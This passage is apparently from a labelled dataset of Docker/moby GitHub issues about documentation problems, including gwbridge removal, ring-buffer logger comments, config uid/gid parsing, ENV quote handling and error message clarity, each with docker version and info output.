/var/lib/docker/devicemapper/devicemapper/metadata\r\n Data Space Used: 12.52GB\r\n Data Space Total: 107.4GB\r\n Data Space Available: 67.38GB\r\n Metadata Space Used: 22.36MB\r\n Metadata Space Total: 2.147GB\r\n Metadata Space Available: 2.125GB\r\n Thin Pool Minimum Free Space: 10.74GB\r\n Deferred Removal Enabled: true\r\n Deferred Deletion Enabled: true\r\n Deferred Deleted Device Count: 0\r\n Library Version: 1.02.146 (2017-12-18)\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: active\r\n NodeID: g87d69ja2y0wy5i9m8pn5b7ai\r\n Is Manager: true\r\n ClusterID: czn8ge5ue920y81jcg2eunijh\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n  Force Rotate: 0\r\n Autolock Managers: false\r\n Root Rotation In Progress: false\r\n Node Address: 192.168.1.65\r\n Manager Addresses:\r\n  192.168.1.65:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: d64c661f1d51c48782c9cec8fda7604785f93587\r\nrunc version: 69663f0bd4b60df09991c08812a60108003fa340\r\ninit version: fec3683\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.17.7-200.fc28.x86_64\r\nOperating System: Fedora 28 (Workstation Edition)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 15.54GiB\r\nName: jxi15zf\r\nID: PHMZ:56J6:TKPH:NYRZ:3UQ5:ZTAR:BTA6:CDOJ:3DDF:32CW:5OMR:4J5O\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nUsername: jayprakashji\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\nWARNING: devicemapper: usage of loopback devices is strongly discouraged for production use.\r\n         Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nI don't suspect that it matters, but I have active swarm (single node), which I use for running apps as services. (i.e. pma for local DB )"},{"labels":["documentation",null,null],"text":"**Description**\r\n\r\nAttempting to follow the steps at https://success.docker.com/article/how-do-i-change-the-docker-gwbridge-address to remove the docker_gwbridge network fails with message: \"Error response from daemon: network docker_gwbridge id xxxxx has active endpoints\"\r\n\r\n**Steps to reproduce the issue:**\r\n1.  Stop all running containers\r\n2. docker network rm docker_gwbridge\r\n\r\n**Describe the results you received:**\r\n\r\n\"Error response from daemon: network docker_gwbridge id xxxxx has active endpoints\"\r\n\r\n**Describe the results you expected:**\r\n\r\ndocker_gwbridge is successfully removed\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nStopping and starting the docker daemon did not help.  To succeed, I had to use \r\n```\r\ndocker network disconnect --force docker_gwbridge gateway_ingress-sbox\r\n```\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      18.03.1-ce\r\n API version:  1.37\r\n Go version:   go1.9.5\r\n Git commit:   9ee9f40\r\n Built:        Thu Apr 26 07:20:16 2018\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n Orchestrator: swarm\r\n\r\nServer:\r\n Engine:\r\n  Version:      18.03.1-ce\r\n  API version:  1.37 (minimum version 1.12)\r\n  Go version:   go1.9.5\r\n  Git commit:   9ee9f40\r\n  Built:        Thu Apr 26 07:23:58 2018\r\n  OS/Arch:      linux/amd64\r\n  Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 0\r\n Running: 0\r\n Paused: 0\r\n Stopped: 0\r\nImages: 22\r\nServer Version: 18.03.1-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: journald\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: active\r\n NodeID: skgf4dv4ux9h1hx3e72mdbfd8\r\n Is Manager: true\r\n ClusterID: zn70moohy7c4flpt96g4begj7\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n  Force Rotate: 0\r\n Autolock Managers: false\r\n Root Rotation In Progress: false\r\n Node Address: 10.7.53.227\r\n Manager Addresses:\r\n  10.7.53.227:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 773c489c9c1b21a6d78b5c538cd395416ec50f88\r\nrunc version: 4fc53a81fb7c994640722ac585fa9ca548971871\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 3.10.0-693.21.1.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 8\r\nTotal Memory: 31.26GiB\r\nName: docker_host\r\nID: DRLU:OX6M:MHCB:46AZ:ZAHV:XLCW:272G:PUZ4:P62L:UILM:RIVX:6JIR\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nVM running on VMWare ESXI/VCenter 6\r\n\r\nComplete steps for troubleshooting:\r\n\r\n```\r\n[centos@docker_host ~]$ docker ps\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n[centos@docker_host ~]$ docker container ls\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n[centos@docker_host ~]$ sudo docker container ls\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n[centos@docker_host ~]$ docker network rm docker_gwbridge\r\nError response from daemon: network docker_gwbridge id 804653507da34e773059ff28f5dfb1055cfbd7c16e01808b372c810af2e6a58c has active endpoints\r\n[centos@docker_host ~]$ docker network inspect docker_gwbridge\r\n[\r\n    {\r\n        \"Name\": \"docker_gwbridge\",\r\n        \"Id\": \"804653507da34e773059ff28f5dfb1055cfbd7c16e01808b372c810af2e6a58c\",\r\n        \"Created\": \"2018-05-01T15:28:49.63617387-07:00\",\r\n        \"Scope\": \"local\",\r\n        \"Driver\": \"bridge\",\r\n        \"EnableIPv6\": false,\r\n        \"IPAM\": {\r\n            \"Driver\": \"default\",\r\n            \"Options\": null,\r\n            \"Config\": [\r\n                {\r\n                    \"Subnet\": \"172.18.0.0/16\",\r\n                    \"Gateway\": \"172.18.0.1\"\r\n                }\r\n            ]\r\n        },\r\n        \"Internal\": false,\r\n        \"Attachable\": false,\r\n        \"Ingress\": false,\r\n        \"ConfigFrom\": {\r\n            \"Network\": \"\"\r\n        },\r\n        \"ConfigOnly\": false,\r\n        \"Containers\": {\r\n            \"ingress-sbox\": {\r\n                \"Name\": \"gateway_ingress-sbox\",\r\n                \"EndpointID\": \"dab9a444acf208de35b164054db597d4c658117a5dba90536c65c6f164fb589d\",\r\n                \"MacAddress\": \"02:42:ac:12:00:02\",\r\n                \"IPv4Address\": \"172.18.0.2/16\",\r\n                \"IPv6Address\": \"\"\r\n            }\r\n        },\r\n        \"Options\": {\r\n            \"com.docker.network.bridge.enable_icc\": \"false\",\r\n            \"com.docker.network.bridge.enable_ip_masquerade\": \"true\",\r\n            \"com.docker.network.bridge.name\": \"docker_gwbridge\"\r\n        },\r\n        \"Labels\": {}\r\n    }\r\n]\r\n[centos@docker_host ~]$ docker system prune\r\nWARNING! This will remove:\r\n        - all stopped containers\r\n        - all networks not used by at least one container\r\n        - all dangling images\r\n        - all build cache\r\nAre you sure you want to continue? [y/N] y\r\nDeleted Containers:\r\n05b07339348a2fc1dd6bac9fbd59e5940b39171d5f96d8ce075bba796e7fdb1e\r\n...\r\n7c06b626377174003790cd32f7f217dd7add6b7fba92c121d3922057addf379a\r\n\r\nDeleted Images:\r\nuntagged: dockersamples/visualizer@sha256:bc680132f772cb44062795c514570db2f0b6f91063bc3afa2386edaaa0ef0b20\r\n...\r\ndeleted: sha256:5bef08742407efd622d243692b79ba0055383bbce12900324f75e56f589aedb0\r\n\r\nTotal reclaimed space: 450MB\r\n[centos@docker_host ~]$ docker network inspect docker_gwbridge\r\n[\r\n    {\r\n        \"Name\": \"docker_gwbridge\",\r\n        \"Id\": \"804653507da34e773059ff28f5dfb1055cfbd7c16e01808b372c810af2e6a58c\",\r\n        \"Created\": \"2018-05-01T15:28:49.63617387-07:00\",\r\n        \"Scope\": \"local\",\r\n        \"Driver\": \"bridge\",\r\n        \"EnableIPv6\": false,\r\n        \"IPAM\": {\r\n            \"Driver\": \"default\",\r\n            \"Options\": null,\r\n            \"Config\": [\r\n                {\r\n                    \"Subnet\": \"172.18.0.0/16\",\r\n                    \"Gateway\": \"172.18.0.1\"\r\n                }\r\n            ]\r\n        },\r\n        \"Internal\": false,\r\n        \"Attachable\": false,\r\n        \"Ingress\": false,\r\n        \"ConfigFrom\": {\r\n            \"Network\": \"\"\r\n        },\r\n        \"ConfigOnly\": false,\r\n        \"Containers\": {\r\n            \"ingress-sbox\": {\r\n                \"Name\": \"gateway_ingress-sbox\",\r\n                \"EndpointID\": \"dab9a444acf208de35b164054db597d4c658117a5dba90536c65c6f164fb589d\",\r\n                \"MacAddress\": \"02:42:ac:12:00:02\",\r\n                \"IPv4Address\": \"172.18.0.2/16\",\r\n                \"IPv6Address\": \"\"\r\n            }\r\n        },\r\n        \"Options\": {\r\n            \"com.docker.network.bridge.enable_icc\": \"false\",\r\n            \"com.docker.network.bridge.enable_ip_masquerade\": \"true\",\r\n            \"com.docker.network.bridge.name\": \"docker_gwbridge\"\r\n        },\r\n        \"Labels\": {}\r\n    }\r\n]\r\n[centos@docker_host ~]$ docker network rm docker_gwbridge\r\nError response from daemon: network docker_gwbridge id 804653507da34e773059ff28f5dfb1055cfbd7c16e01808b372c810af2e6a58c has active endpoints\r\n[centos@docker_host ~]$ docker stop ingress-sbox\r\nError response from daemon: No such container: ingress-sbox\r\n[centos@docker_host ~]$ docker stop gateway_ingress-sbox\r\nError response from daemon: No such container: gateway_ingress-sbox\r\n[centos@docker_host ~]$ docker network disconnect --force docker_gwbridge ingress-sbox\r\nError response from daemon: endpoint ingress-sbox not found\r\n[centos@docker_host ~]$ docker network disconnect --force docker_gwbridge gateway_ingress-sbox\r\n[centos@docker_host ~]$ docker network inspect docker_gwbridge\r\n[\r\n    {\r\n        \"Name\": \"docker_gwbridge\",\r\n        \"Id\": \"804653507da34e773059ff28f5dfb1055cfbd7c16e01808b372c810af2e6a58c\",\r\n        \"Created\": \"2018-05-01T15:28:49.63617387-07:00\",\r\n        \"Scope\": \"local\",\r\n        \"Driver\": \"bridge\",\r\n        \"EnableIPv6\": false,\r\n        \"IPAM\": {\r\n            \"Driver\": \"default\",\r\n            \"Options\": null,\r\n            \"Config\": [\r\n                {\r\n                    \"Subnet\": \"172.18.0.0/16\",\r\n                    \"Gateway\": \"172.18.0.1\"\r\n                }\r\n            ]\r\n        },\r\n        \"Internal\": false,\r\n        \"Attachable\": false,\r\n        \"Ingress\": false,\r\n        \"ConfigFrom\": {\r\n            \"Network\": \"\"\r\n        },\r\n        \"ConfigOnly\": false,\r\n        \"Containers\": {},\r\n        \"Options\": {\r\n            \"com.docker.network.bridge.enable_icc\": \"false\",\r\n            \"com.docker.network.bridge.enable_ip_masquerade\": \"true\",\r\n            \"com.docker.network.bridge.name\": \"docker_gwbridge\"\r\n        },\r\n        \"Labels\": {}\r\n    }\r\n]\r\n[centos@docker_host ~]$ docker network rm docker_gwbridge\r\ndocker_gwbridge\r\n[centos@docker_host ~]$ docker network ls\r\nNETWORK ID          NAME                DRIVER              SCOPE\r\nd9432128aa1c        bridge              bridge              local\r\nacc20ffb4d59        host                host                local\r\nxrad9row46w7        ingress             overlay             swarm\r\nbed9358defe1        none                null                local\r\n\r\n```"},{"labels":["documentation",null,null],"text":"**Description**\r\nThe Enqueue function of ringbuff used for RingLogger located in [ring.go](https://github.com/moby/moby/blob/master/daemon/logger/ring.go#L152-L174) dose not work as it documented that  oldest item will be dropped to make room for new item when buffer is full. Instead, the new item will be dropped. \r\n\r\ncode snippet as shown below\r\n```\r\n// Enqueue adds a message to the buffer queue\r\n// If the message is too big for the buffer it drops the oldest messages to make room\r\n// If there are no messages in the queue and the message is still too big, it adds the message anyway.\r\nfunc (r *messageRing) Enqueue(m *Message) error {\r\n\tmSize := int64(len(m.Line))\r\n\r\n\tr.mu.Lock()\r\n\tif r.closed {\r\n\t\tr.mu.Unlock()\r\n\t\treturn errClosed\r\n\t}\r\n\tif mSize+r.sizeBytes > r.maxBytes && len(r.queue) > 0 {\r\n\t\tr.wait.Signal()\r\n\t\tr.mu.Unlock()\r\n\t\treturn nil\r\n\t}\r\n\r\n\tr.queue = append(r.queue, m)\r\n\tr.sizeBytes += mSize\r\n\tr.wait.Signal()\r\n\tr.mu.Unlock()\r\n\treturn nil\r\n}\r\n```\r\n\r\nA similar misleading comment also appears in the [ring_test.go](https://github.com/moby/moby/blob/master/daemon/logger/ring_test.go#L51-L70) file. the comment said that the queue should have message for \"5\" to \"10\", however, it's \"0\" to \"4\" being tested.\r\n\r\n```\r\nfunc TestRingCap(t *testing.T) {\r\n\tr := newRing(5)\r\n\tfor i := 0; i < 10; i++ {\r\n\t\t// queue messages with \"0\" to \"10\"\r\n\t\t// the \"5\" to \"10\" messages should be dropped since we only allow 5 bytes in the buffer\r\n\t\tif err := r.Enqueue(&Message{Line: []byte(strconv.Itoa(i))}); err != nil {\r\n\t\t\tt.Fatal(err)\r\n\t\t}\r\n\t}\r\n\r\n\t// should have messages in the queue for \"5\" to \"10\"\r\n\tfor i := 0; i < 5; i++ {\r\n\t\tm, err := r.Dequeue()\r\n\t\tif err != nil {\r\n\t\t\tt.Fatal(err)\r\n\t\t}\r\n\t\tif string(m.Line) != strconv.Itoa(i) {\r\n\t\t\tt.Fatalf(\"got unexpected message for iter %d: %s\", i, string(m.Line))\r\n\t\t}\r\n\t}\r\n.......\r\n```\r\n\r\n**Describe the results you expected:**\r\n\r\nEither fix the comment and document to indicated that when buffer is full, new message will be skipped. or fix the code logic to reflect the document"},{"labels":["documentation",null,null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\nI'm trying to specify user and group ownership of a docker config during creating\r\na docker service in swarm mode. Per [docker config doc](https://docs.docker.com/engine/swarm/configs/), I can use uid/gid or user/group name\r\nas value of `uid=`/`gid=` option. But based on my test, it seems that only uid/gid\r\nis accepted, otherwise the service fails with `starting container failed: strconv.Atoi: parsing \"<user/group-name-here>\": invalid syntax` error.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Take nginx service as an example. Create an empty file `foo.conf` as docker config.\r\n2. Create a service with following command:\r\n```sh\r\ndocker service create -d --config \\\r\n        source=foo.conf,target=/foo.conf,uid=nginx,gid=nginx \\\r\n        --replicas 1 --name nginx \\\r\n    nginx:alpine\r\n```\r\n\r\n**Describe the results you received:**\r\nService failed to start. `docker service ps nginx` shows the following:\r\n```sh\r\n$ docker service ps --no-trunc nginx\r\nID                          NAME                IMAGE                                                                                  NODE                     DESIRED STATE       CURRENT STATE                    ERROR                                                                        PORTS\r\nwz83ikaaul0awr9d4nop44n24   nginx.1             nginx:alpine@sha256:48947591194ac5a9dce1e110f9198a547debb21630f121081640b87d99ca8b11                            Ready               Pending less than a second ago                                                                                \r\n27wfuzre1iz3gwcw644h79k9h    \\_ nginx.1         nginx:alpine@sha256:48947591194ac5a9dce1e110f9198a547debb21630f121081640b87d99ca8b11   <...>                    Shutdown            Failed less than a second ago    \"starting container failed: strconv.Atoi: parsing \"nginx\": invalid syntax\"   \r\nf4zu8squgvk760pefn8ts62jb    \\_ nginx.1         nginx:alpine@sha256:48947591194ac5a9dce1e110f9198a547debb21630f121081640b87d99ca8b11   <...>                    Shutdown            Failed 5 seconds ago             \"starting container failed: strconv.Atoi: parsing \"nginx\": invalid syntax\"   \r\nj9yx5mtk7p0rs7ylnv9kekw6h    \\_ nginx.1         nginx:alpine@sha256:48947591194ac5a9dce1e110f9198a547debb21630f121081640b87d99ca8b11   <...>                    Shutdown            Failed 10 seconds ago            \"starting container failed: strconv.Atoi: parsing \"nginx\": invalid syntax\"\r\n```\r\n\r\n**Describe the results you expected:**\r\nService starts successfully.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nWith uid/gid rather than name, service starts successfully.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nDocker version 18.02.0-ce, build fc4de447b5\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 19\r\n Running: 1\r\n Paused: 0\r\n Stopped: 18\r\nImages: 24\r\nServer Version: 18.02.0-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: xfs\r\n Supports d_type: true\r\n Native Overlay Diff: false\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: active\r\n NodeID: 4m0cef9637sue7o62ujt2ghei\r\n Is Manager: true\r\n ClusterID: l2e2hwgoirkr6v85bxsax1cn8\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n  Force Rotate: 0\r\n Autolock Managers: false\r\n Root Rotation In Progress: false\r\n Node Address: 192.168.99.1\r\n Manager Addresses:\r\n  192.168.99.1:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 9b55aab90508bd389d7654c4baf173a981477d55\r\nrunc version: 9f9c96235cc97674e935002fc3d78361b696a69e\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.15.5-1-ARCH\r\nOperating System: Arch Linux\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 8\r\nTotal Memory: 7.712GiB\r\nName: <...>\r\nID: 6L44:BPEL:FEEL:D57Z:UXC5:Z3J3:LGYQ:2E2I:NDRD:EQRE:EA75:ZYBL\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n- OS: Arch Linux       "},{"labels":["documentation"],"text":"\r\n<img width=\"1104\" alt=\"screen shot 2018-02-08 at 3 01 14 pm\" src=\"https://user-images.githubusercontent.com/15134885/35995402-32453670-0ce1-11e8-848b-14d1cc3b1e38.png\">\r\n**Description**\r\n\r\nGodoc is down for client reference\r\n\r\n**Steps to reproduce the issue:**\r\n1. https://godoc.org/github.com/docker/docker/client\r\n2. view the empty chasm that is a 404 error\r\n\r\nOther packages are listed fine on Godoc currently and I was able to view the docs just the other day perfectly fine, so I am guessing that something changed in the commits merged into `master` today...\r\n\r\n"},{"labels":["documentation",null,null],"text":"As a knowledgeable-but-not-expert user, I recently got this message:\r\n\r\n> ERROR: for containername  Cannot create container for service containername: privileged mode is incompatible with user namespaces.  You must run the container in the host namespace when running privileged mode\r\n\r\nMy first reaction was [\"what the **** does this mean?\"](https://media.giphy.com/media/kF0ClnIcSBiDe/giphy.gif).\r\n\r\nThis ticket documents how an average user (senior-ish software engineer, uses docker at work and at home) solved this problem using this error message and Google.\r\n\r\nI take full responsibility for my incompetence, but there are many more of my kind, and the humane thing to do is to guide them towards a solution. **We need a better error message.** I hope that ticket makes a strong case for a better error message and better documentation to support it.\r\n\r\n## Context\r\n\r\nI updated docker recently. Then things something stopped working, and this error message was the only hint I got. I don't understand any of the concept it mentions, or which steps to take in order to fix my problem.\r\n\r\n## Fixing the issue\r\n\r\nWhen you are knee-deep in complex issues all day, you can easily forget how the average user sees things, so I wrote down my thought process down while I fixed the issue so you could understand my perspective as an end user.\r\n\r\n1. What the f- does this mean? This worked yesterday! (at this point, I'm already 3 levels deep on a completely different issue)\r\n2. What's privileged mode? What are user name spaces?\r\n3. What does \"running the container in the host namespace\" mean? *What am I supposed to do?*\r\n4. Maybe if I try to run it without sudo... nope.\r\n5. *Googles the error message*\r\n6. \"Introduction to User Namespaces in Docker Engine\" ([link](https://success.docker.com/article/Introduction_to_User_Namespaces_in_Docker_Engine))\r\n7. \"A namespace wraps a global system resource in an abstraction that makes it appear to the processes within...\". Nope, can't understand any of that.\r\n8. I'm halfway through that page, and I'm still no closer to a useful explanation. What is this? What does any of this even mean? Why doesn't it work anymore?\r\n9. *Googles the error message again*\r\n10. Okay, so according to [this article](https://luppeng.wordpress.com/2016/07/04/docker-user-namespaces/), it seems to be a way to prevent a docker root user to do nasty stuff on the host machine. Why didn't they tell me that in step 6?\r\n11. \"--userns-remap=default\" can allegedly fix this. Nope, can't just add it to `docker-compose up`.\r\n12. `userns_mode: \"host\"` apparently disables that. All I need to do is bump the docker-compose version to 2.1\r\n13. \"2.1\" is not a valid version, for some reason that is completely unexplained by this generic error message. I'm using the latest version of docker and docker-compose, which is why I'm getting the errors above in the first place\r\n14. (at this point, I should state that I am slowly losing my cool)\r\n14. Oh, it seems like this feature was added in a version that's not available on the docker PPA. Time to update docker-compose to an unreleased version to fix a problem in a released version. [This page](https://github.com/docker/compose/releases) helped me.\r\n15. \"docker-compose version 1.19.0-rc3\". Sweet, it's working!\r\n16. Aaaaand it works. I don't know why it works, but it works, and that's enough for one day.\r\n\r\nAll of this, including creating the ticket and finding the Office Space gif took me about 1.5 hours. I believe a more appropriate error message and documentation page could have reduced that to a few minutes. I apologize for the odd format of this ticket, but I hope it's still helpful."},{"labels":[null,"documentation",null],"text":"**Description**\r\n\r\nWhen using `ENV` in the form `ENV <key> <value>` both single and double quotes are being\r\nstripped from `<value>`.\r\n\r\nAccording to [the documentation](https://docs.docker.com/engine/reference/builder/#env):\r\n\r\n> The `ENV` instruction has two forms. The first form, `ENV <key> <value>`, will set a single variable to a value. The entire string after the first space will be treated as the `<value>` - including characters such as spaces and quotes.\r\n\r\nI'm seeing double and single quotes being stripped from entries such as these:\r\n\r\n```\r\nENV DQUOTE One \"two two\" three four\r\nENV SQUOTE One 'two two' three four\r\n```\r\n\r\nBackslashes are also being interpreted:\r\n\r\n```\r\nENV SBACKSLASH One two\\ two three four\r\nENV DBACKSLASH One two\\\\ two three four\r\n```\r\n\r\n**Steps to reproduce the issue:**\r\n\r\n1. `git clone git@github.com:gentlemanautomaton/docker-env-quote-test.git`\r\n2. `cd docker-env-quote-test`\r\n3. `docker build -t gentlemanautomaton/docker-env-quote-test:latest .`\r\n4. `docker inspect gentlemanautomaton/docker-env-quote-test:latest`\r\n\r\n**Describe the results you received:**\r\n\r\n```\r\n\"Env\": [\r\n\t\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\r\n\t\"DQUOTE=One two two three four\",\r\n\t\"SQUOTE=One two two three four\",\r\n\t\"SBACKSLASH=One two two three four\",\r\n\t\"DBACKSLASH=One two\\\\ two three four\",\r\n\t\"BACKTICK=One `two two` three four\"\r\n],\r\n```\r\n\r\n**Describe the results you expected:**\r\n\r\n```\r\n\"Env\": [\r\n\t\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\r\n\t\"DQUOTE=One \\\"two two\\\" three four\",\r\n\t\"SQUOTE=One 'two two' three four\",\r\n\t\"SBACKSLASH=One two\\\\ two three four\",\r\n\t\"DBACKSLASH=One two\\\\\\\\ two three four\",\r\n\t\"BACKTICK=One `two two` three four\"\r\n],\r\n```\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nIn the hope that it's useful, I created a test `Dockerfile` for reproduction in this repo:\r\n\r\n* https://github.com/gentlemanautomaton/docker-env-quote-test\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:       18.01.0-ce\r\n API version:   1.35\r\n Go version:    go1.9.2\r\n Git commit:    03596f5\r\n Built: Wed Jan 10 20:13:21 2018\r\n OS/Arch:       linux/amd64\r\n Experimental:  false\r\n Orchestrator:  swarm\r\n\r\nServer:\r\n Engine:\r\n  Version:      18.01.0-ce\r\n  API version:  1.35 (minimum version 1.12)\r\n  Go version:   go1.9.2\r\n  Git commit:   03596f5\r\n  Built:        Wed Jan 10 20:11:47 2018\r\n  OS/Arch:      linux/amd64\r\n  Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 3\r\n Running: 0\r\n Paused: 0\r\n Stopped: 3\r\nImages: 361\r\nServer Version: 18.01.0-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 89623f28b87a6004d4b785663257362d1658a729\r\nrunc version: b2567b37d7b75eb4cf325b77297b140ea686ce8f\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.13.0-25-generic\r\nOperating System: Ubuntu 17.10\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 16\r\nTotal Memory: 31.47GiB\r\nName: REDACTED\r\nID: SVWR:PGRT:4NZT:KVIT:DVBE:EKDI:GG2T:46U2:5PEW:X4UL:LGQZ:SEL4\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\nWARNING: No swap limit support\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nThe test was performed with `docker-ce` running on physical hardware."},{"labels":["documentation",null],"text":"Just a heads up that the examples over here - https://docs.docker.com/engine/reference/commandline/inspect/#extended-description are incorrect if an overlay network is used.  The Go template extracts 2 IPs in this case (one from the ingress layer and the second the one used by the container) and concatenates them.  Here is an example:\r\n\r\n```\r\n$ docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' container1\r\n10.255.0.2110.0.1.9\r\n```\r\n\r\nThe above is on Docker 17.12\r\n\r\n```\r\n$ docker version\r\nClient:\r\n Version:       17.12.0-ce-rc2\r\n API version:   1.35\r\n Go version:    go1.9.2\r\n Git commit:    f9cde63\r\n Built: Tue Dec 12 06:38:26 2017\r\n OS/Arch:       linux/amd64\r\n\r\nServer:\r\n Engine:\r\n  Version:      17.12.0-ce-rc2\r\n  API version:  1.35 (minimum version 1.12)\r\n  Go version:   go1.9.2\r\n  Git commit:   f9cde63\r\n  Built:        